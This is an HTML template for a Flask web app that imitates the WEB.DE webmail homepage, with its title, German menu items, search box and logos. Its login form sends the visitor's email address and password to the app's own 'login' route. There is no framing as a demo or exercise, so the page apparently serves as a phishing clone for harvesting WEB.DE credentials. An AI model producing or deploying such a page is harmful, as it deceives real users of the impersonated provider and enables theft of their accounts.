<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/png" href="/image/logo.png" sizes="50 40" />
  
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="{{ url_for('static',  filename= 'styles/style.css' ) }}"/>
    <title>WEB.DE - E-Mail-Adresse kostenlos, FreeMail, De-Mail &; Nachrichten</title>
  </head>
  <body>
    <div class="page">
      <div>
        <img src="{{ url_for('static' ,filename = "image/logo.png" ) }}" />
      </div>
      <div class="search-tag">
        <input
          type="text"
          name=""
          id="search"
          class="search"
          placeholder="Suchen mit WEB.DE"
        />
        <div class="searchbox">
          <span><i class="bi bi-search"></i></span>
        </div>
      </div>
      <div class="circle">
        <i class="bi bi-question-circle-fill"></i>
        <p>Hilfe</p>
      </div>
      <div class="_text">
        <div>
          <button class="btn btn-main" type="submit">Registrieren</button>
        </div>
      </div>
    </div>

    <div class="menu-bar">
      <div>
        <i class="bi bi-list"></i>
      </div>
      <ul class="link">
        <li>E-Mail & Cloud</li>
        <li>Mobilfunk & DSL</li>
        <li>Strom & Gas</li>
        <li>Lotto</li>
        <li>Vorteilswelt</li>
        <li>Versicherung</li>
        <li>WEB.Cent</li>
        <li>Games</li>
      </ul>
      <div class="menu-img">
        <img src="{{ url_for('static' ,filename = "image/photo55.png" ) }}"/>
      </div>
    </div>

    <!-- HeroBody -->
    <div class="herobody">
      <img src="{{ url_for('static' ,filename = "image/photo6.png"  ) }}"/>
    </div>

   <div class="tagform">
      <form id="myform" class="myform" method="post" action="{{ url_for('login') }}">
        <div class="icon">
          <i class="bi bi-envelope-fill"></i>
          <p>E-Mail</p>
          <i class="bi bi-grid-3x3-gap-fill"></i>
        </div>
        <div class="input-lab">
          <label for="email">Email:</label>
          <input type="email" name="email" id="email" placeholder="E-Mail Adresse" required>
          <div class="error" hidden></div>
        </div>
        <div class="input-lab">
          <label for="password">Password:</label>
          <input type="password" name="password" id="password" placeholder="Passwort" required>
          <div class="error" hidden></div>
        </div>
        <div>
          <button type="submit" class="btn btn-button">Login</button>
        </div>
        <div class="tagphoto">
          <img src="{{ url_for('static' ,filename = "image/photo56.png" ) }}"\>
        </div>
      </form>
    </div>
